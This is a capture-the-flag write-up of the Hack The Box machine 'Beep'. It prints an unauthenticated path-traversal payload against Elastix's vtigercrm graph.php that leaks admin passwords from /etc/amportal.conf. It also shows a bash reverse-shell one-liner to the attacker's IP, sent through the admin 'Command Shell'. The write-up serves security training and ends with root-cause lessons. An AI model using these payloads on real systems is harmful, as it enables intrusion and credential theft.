# HTB: Beep

**Difficulty:** Easy
**OS:** Linux
**Target IP:** 10.129.229.183
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning
Started with a fast port sweep using `rustscan`, followed by a full service/version scan with `nmap` against the discovered ports.

```bash
rustscan -a 10.129.229.183
```

```
Open 10.129.229.183:22
Open 10.129.229.183:25
Open 10.129.229.183:80
Open 10.129.229.183:110
Open 10.129.229.183:111
Open 10.129.229.183:143
Open 10.129.229.183:856
Open 10.129.229.183:443
Open 10.129.229.183:993
Open 10.129.229.183:995
Open 10.129.229.183:3306
Open 10.129.229.183:4190
Open 10.129.229.183:4445
Open 10.129.229.183:4559
Open 10.129.229.183:5038
Open 10.129.229.183:10000
```

A large, noisy port list — mail services (25/110/143/993/995/4190), RPC (111/856), MySQL (3306), Asterisk Call Manager (5038), and a management interface on 10000. This spread is a strong fingerprint for an **Elastix / FreePBX** VoIP appliance.

```bash
nmap -sCV -T4 -p $(cat ports | awk -F ":" '{print $2}' | tr '\n' "," | sed 's/,$//') 10.129.229.183 -oA nmap/nmap
```

Key results:

```
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.129.229.183/
110/tcp   open  pop3?
111/tcp   open  rpcbind
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry
|_/
856/tcp   open  status
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
```

Confirmed: **Elastix login page** on port 443, and a **Webmin (MiniServ)** instance on port 10000. Both are classic entry points for this class of box.

A supplementary UDP scan was run for completeness but didn't surface anything actionable beyond expected services (rpcbind, ntp, sip, etc.):

```bash
nmap -sU -top-ports 100 10.129.229.183
```

Also noticed a large clock skew reported by `nmap` (~3h19m). Fixed this ahead of any auth-related testing with:

```bash
ntpdate 10.129.229.183
```

---

## 2. Web Enumeration

### 2.1 Fixing TLS Access

Port 443 initially failed to load in Firefox:

```
Error code: SSL_ERROR_UNSUPPORTED_VERSION
This website might not support the TLS 1.2 protocol, which is the minimum version supported by Firefox.
```

The server only supports an older TLS/SSL version. Fixed by lowering Firefox's minimum accepted TLS version:

1. Navigate to `about:config`.
2. Search for `security.tls.version.min`.
3. Set the value to `1`.

With that, `https://10.129.229.183/` loaded the **Elastix** login page. No valid credentials were available at this point, and brute-forcing the Webmin login (`https://10.129.229.183:10000/session_login.cgi`) with default creds triggered a lockout — so this path was abandoned in favor of finding an unauthenticated vulnerability.

### 2.2 Identifying a Known Vulnerability

Ran `searchsploit` against Elastix, given the version fingerprint from the login page and Apache banner:

```bash
searchsploit Elastix
```

```
Elastix - 'page' Cross-Site Scripting                              | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities             | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities        | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                    | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                   | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                  | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution               | php/webapps/18650.py
```

The **LFI in `graph.php`** (exploit-db 37637) stood out as the most direct route — it doesn't require authentication and can be used to read arbitrary local files through the vTiger CRM component bundled with Elastix.

---

## 3. Exploitation — Foothold

### 3.1 Local File Inclusion → Credential Disclosure

The LFI vulnerability abuses the `current_language` parameter of `vtigercrm/graph.php`, which fails to sanitize path traversal sequences, allowing arbitrary file reads via a null-byte-terminated path:

```
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

The published PoC script (`37637.pl`) automates this against a target and checks the response for a known FreePBX string to confirm success. Rather than relying purely on the script, I reproduced the request manually and confirmed it pulled back the full contents of **`/etc/amportal.conf`** — FreePBX's core configuration file, which stores credentials for the database, the Asterisk Manager Interface, and the FreePBX/ARI admin panel:

```
AMPMGRUSER=admin
AMPMGRPASS=jEhdIekWmdjE
...
ARI_ADMIN_USERNAME=admin
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
...
FOPPASSWORD=jEhdIekWmdjE
```

The recovered password `jEhdIekWmdjE` is reused across several of the admin-facing accounts in the file.

### 3.2 Authenticating to Elastix

Using the disclosed credentials — **`root:jEhdIekWmdjE`** — I logged into the Elastix web interface at `https://10.129.229.183/`.

### 3.3 Command Execution via the Admin Panel

Elastix's admin UI exposes a **"Command Shell"** utility under the *Others* category in the left-hand navigation panel — intended for administrators to run diagnostic commands directly on the underlying OS. Since this runs in the context of the web server/Asterisk process, it provides a direct path to command execution.

Used it to trigger a reverse shell:

```bash
sh -i >& /dev/tcp/10.10.15.146/4444 0>&1
```

Caught the connection with a Netcat listener:

```bash
nc -lvnp 4444
```

```
listening on [any] 4444 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.55.219] 57672
sh: no job control in this shell
sh-3.2# whoami
root
sh-3.2# pwd
/root
```

✅ Shell obtained — and notably, the Elastix command-execution component runs **as `root`**, so the foothold and full compromise happened in the same step. No separate privilege escalation stage was required on this box.

---

## 4. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → large VoIP-appliance service footprint; identified Elastix (443) and Webmin (10000) |
| Access fix | Lowered Firefox's minimum TLS version to reach the legacy Apache/SSL stack |
| Vulnerability ID | `searchsploit` → Elastix 2.2.0 `graph.php` LFI (exploit-db 37637) |
| Credential disclosure | LFI read `/etc/amportal.conf`, exposing `AMPMGRPASS` / `ARI_ADMIN_PASSWORD` / `FOPPASSWORD` (`jEhdIekWmdjE`) |
| Authentication | Logged into Elastix as `root:jEhdIekWmdjE` |
| Code execution / Root | Used the built-in "Command Shell" admin feature to spawn a reverse shell — process already running as `root` |

**Root cause / lessons learned:**
- An unauthenticated path-traversal/LFI in a bundled third-party component (vTiger CRM's `graph.php`) allowed disclosure of a sensitive configuration file that should never be web-readable.
- Password reuse across multiple service accounts (`AMPMGRPASS`, `ARI_ADMIN_PASSWORD`, `FOPPASSWORD`) turned a single leaked value into full admin access.
- The Elastix web application — and its "Command Shell" convenience feature in particular — ran with root privileges, meaning any authentication bypass or credential leak translates immediately into full system compromise. Administrative web interfaces like this should run as a low-privileged service account, with `sudo` used selectively for the specific operations that require elevation.
- Legacy, unpatched appliance software (Elastix 2.2.0 on CentOS with Apache 2.2.3, OpenSSH 4.3) carries a large number of known CVEs; timely patching or replacement would have closed this off entirely.

---

## 5. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `ntpdate` — clock sync (resolved Kerberos/TLS-adjacent skew warnings)
- Firefox `about:config` (`security.tls.version.min`) — legacy TLS access
- `searchsploit` — vulnerability identification
- Elastix 2.2.0 `graph.php` LFI PoC (exploit-db 37637) — credential disclosure
- Elastix admin panel "Command Shell" — code execution
- Netcat (`nc`) — shell handling
